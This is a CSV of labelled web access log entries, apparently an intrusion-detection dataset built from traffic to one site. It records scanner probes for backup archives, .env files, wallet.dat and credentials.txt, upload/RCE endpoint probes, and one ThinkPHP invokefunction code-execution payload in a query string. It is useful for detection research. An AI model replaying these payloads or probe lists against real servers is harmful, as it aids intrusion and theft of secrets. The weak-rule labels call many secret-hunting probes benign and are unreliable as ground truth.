source_log,timestamp,ip,method,path,query,path_with_query,protocol,status,bytes,referer,user_agent,label,label_source,label_reason,text
2022-12-22,2022-12-22T14:31:39-08:00,185.92.25.55,HEAD,/bak/backup.rar,,/bak/backup.rar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T02:26:58-08:00,49.44.82.7,GET,/,,/,HTTP/1.1,301,438,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:59:40-08:00,185.192.16.11,HEAD,/www.sql,,/www.sql,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/www.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:06-07:00,125.78.229.99,POST,/uploads/dede/sys_verifies.php,action=down,/uploads/dede/sys_verifies.php?action=down,HTTP/1.1,418,746,http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=POST PATH=/uploads/dede/sys_verifies.php QUERY=action=down PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:15:09-08:00,85.10.56.247,HEAD,/bak/www.tar,,/bak/www.tar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:09:58-08:00,194.169.217.1,HEAD,/back/public_html.rar,,/back/public_html.rar,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:40:02-08:00,185.192.71.170,HEAD,/old/website.rar,,/old/website.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:44:04-08:00,98.159.226.188,HEAD,/backups/config.json,,/backups/config.json,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:17:11-08:00,84.247.59.175,HEAD,/config.json,,/config.json,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:10:14-08:00,188.212.135.105,HEAD,/bak/wallet.dat,,/bak/wallet.dat,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T11:26:26-08:00,120.245.60.11,GET,/robots.txt,,/robots.txt,HTTP/1.1,301,458,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:15:38-08:00,212.30.37.137,HEAD,/old/backup.sql.tar,,/old/backup.sql.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:06:13-08:00,98.159.226.241,HEAD,/old/website.tar,,/old/website.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T11:59:50-08:00,45.130.202.69,HEAD,/www.tar,,/www.tar,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:00:58-08:00,84.247.59.159,HEAD,/.env,,/.env,HTTP/1.1,404,124,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/.env QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:29-07:00,44.195.86.98,GET,/wp-content/upload.php,,/wp-content/upload.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/wp-content/upload.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:16:07-08:00,212.30.33.45,HEAD,/back/www.rar,,/back/www.rar,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:04:33-08:00,188.212.135.102,HEAD,/back/website.rar,,/back/website.rar,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:51:50-08:00,217.138.202.62,HEAD,/old/backup.rar,,/old/backup.rar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:52:01-08:00,85.206.166.82,HEAD,/website.rar,,/website.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:50:25-08:00,194.169.217.150,HEAD,/backups/secrepo.com.sql,,/backups/secrepo.com.sql,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:52:40-08:00,185.195.19.200,HEAD,/bak/public_html.tar,,/bak/public_html.tar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:38:33-08:00,45.128.199.39,HEAD,/restore/bak.tar,,/restore/bak.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:13:02-08:00,194.169.217.215,HEAD,/bak/sftp-config.json,,/bak/sftp-config.json,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:31:37-08:00,45.67.99.142,HEAD,/backups/mysql.sql,,/backups/mysql.sql,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/mysql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:05:04-08:00,157.97.120.10,HEAD,/old/secrepo.com.rar,,/old/secrepo.com.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:20:49-08:00,82.118.30.73,HEAD,/back/.well-known.zip,,/back/.well-known.zip,HTTP/1.1,301,187,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/back/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:48:49-08:00,82.118.30.33,HEAD,/bak/website.tar,,/bak/website.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:53:53-08:00,157.97.120.9,HEAD,/old/wallet.dat,,/old/wallet.dat,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:47:41-08:00,85.203.34.102,HEAD,/bak/www.sql,,/bak/www.sql,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/www.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T23:07:40-08:00,194.38.20.161,GET,/assets/plugins/fileupload/server/php/index.php,file=tf2rghf.jpg,/assets/plugins/fileupload/server/php/index.php?file=tf2rghf.jpg,HTTP/1.1,429,487,,ALittle Client,command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/assets/plugins/fileupload/server/php/index.php QUERY=file=tf2rghf.jpg PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:02:21-08:00,45.86.200.113,HEAD,/backup/directory.tar,,/backup/directory.tar,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:43:12-08:00,45.8.17.9,HEAD,/backups/dump.sql,,/backups/dump.sql,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:53:14-08:00,45.140.245.20,HEAD,/old/mysql.sql,,/old/mysql.sql,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/mysql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T05:27:31-08:00,222.186.30.188,GET,/index.php,s=admin/\think\app/invokefunction&function=base64_encode&vars[]=ck996789baidu.com,/index.php?s=admin/\think\app/invokefunction&function=base64_encode&vars[]=ck996789baidu.com,HTTP/1.1,404,338,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",command_exec,weak_rule:command_exec,Code execution/webshell pattern,METHOD=GET PATH=/index.php QUERY=s=admin/\think\app/invokefunction&function=base64_encode&vars[]=ck996789baidu.com PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T20:51:24-07:00,34.217.115.110,GET,/Datasets Description/HTML_Bro_log_1/dns.html,,/Datasets Description/HTML_Bro_log_1/dns.html,HTTP/1.1,200,1837,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0,benign,default_benign,No weak-rule hit,METHOD=GET PATH=/Datasets Description/HTML_Bro_log_1/dns.html QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:04-07:00,125.78.229.99,POST,/FCKeditor/editor/filemanager/connectors/asp/connector.asp,Command=FileUpload&Type=File&CurrentFolder=/,/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=/,HTTP/1.1,404,328,http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=POST PATH=/FCKeditor/editor/filemanager/connectors/asp/connector.asp QUERY=Command=FileUpload&Type=File&CurrentFolder=/ PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:06:37-08:00,45.91.20.120,HEAD,/backup.sql,,/backup.sql,HTTP/1.1,301,177,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:09:08-08:00,212.30.33.28,HEAD,/backup.rar,,/backup.rar,HTTP/1.1,301,177,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup.rar QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:28-07:00,44.195.86.98,GET,/ups.php,,/ups.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/ups.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:28:56-08:00,98.159.226.191,HEAD,/bak/bak.rar,,/bak/bak.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/bak.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:16:43-08:00,85.10.56.247,HEAD,/www.rar,,/www.rar,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:00:48-08:00,157.97.120.9,HEAD,/backups/credentials.txt,,/backups/credentials.txt,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:04:41-08:00,98.159.226.187,HEAD,/backups/.env,,/backups/.env,HTTP/1.1,301,179,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/backups/.env QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:24:38-08:00,45.92.228.111,HEAD,/sftp-config.json,,/sftp-config.json,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:30:17-08:00,185.82.72.200,HEAD,/restore/website.rar,,/restore/website.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:59:48-08:00,93.115.7.123,HEAD,/old/www.rar,,/old/www.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:31:13-08:00,157.97.120.26,HEAD,/restore/.env,,/restore/.env,HTTP/1.1,301,179,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/restore/.env QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:15:36-08:00,98.159.226.188,HEAD,/restore/sql.sql,,/restore/sql.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:06:18-08:00,45.91.21.30,HEAD,/backups/www.sql,,/backups/www.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/www.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:25:24-08:00,82.118.30.80,HEAD,/back/backup.sql,,/back/backup.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:21:11-08:00,45.86.200.152,HEAD,/.bash_history,,/.bash_history,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:41:16-08:00,45.89.242.190,HEAD,/directory.rar,,/directory.rar,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/directory.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:27:42-08:00,85.10.56.233,HEAD,/backups/sql.sql,,/backups/sql.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/sql.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:30-07:00,44.195.86.98,GET,/upload.php,,/upload.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/upload.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:43:41-08:00,98.159.226.71,HEAD,/bak/www.rar,,/bak/www.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:24:06-08:00,212.30.33.22,HEAD,/restore/.well-known.zip,,/restore/.well-known.zip,HTTP/1.1,404,275,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/restore/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:18:44-08:00,98.159.226.184,HEAD,/old/.well-known.zip,,/old/.well-known.zip,HTTP/1.1,404,275,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/old/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:47:13-08:00,85.10.56.234,HEAD,/restore/bak.rar,,/restore/bak.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/bak.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:19:58-08:00,85.203.45.190,HEAD,/old/www.sql,,/old/www.sql,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/www.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:48:38-08:00,45.128.199.81,HEAD,/back/backup.tar,,/back/backup.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:52:44-08:00,45.134.22.48,HEAD,/restore/dump.sql,,/restore/dump.sql,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/dump.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T15:12:36-07:00,128.199.13.166,GET,/,,/,HTTP/1.0,200,49096,,"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.0
2022-12-22,2022-12-22T13:30:12-08:00,98.159.226.176,HEAD,/backup/secrepo.com.rar,,/backup/secrepo.com.rar,HTTP/1.1,301,189,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:08:05-08:00,85.206.175.221,HEAD,/backups/.well-known.zip,,/backups/.well-known.zip,HTTP/1.1,301,190,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/backups/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:23:25-08:00,185.195.19.202,HEAD,/BlockCypher.log,,/BlockCypher.log,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/BlockCypher.log QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:15:17-08:00,212.30.36.68,HEAD,/backups/directory.tar,,/backups/directory.tar,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:19:10-08:00,45.89.242.199,HEAD,/back/mysql.sql,,/back/mysql.sql,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/mysql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:23:30-08:00,98.159.226.185,HEAD,/restore/backup.rar,,/restore/backup.rar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T11:58:36-08:00,212.30.37.121,HEAD,/restore/.bash_history,,/restore/.bash_history,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:42:44-08:00,185.192.71.170,HEAD,/old/public_html.tar,,/old/public_html.tar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:05:26-08:00,45.91.20.105,HEAD,/back/bak.tar,,/back/bak.tar,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:10:44-08:00,98.159.226.29,HEAD,/back/directory.tar,,/back/directory.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/directory.tar QUERY= PROTOCOL=HTTP/1.1
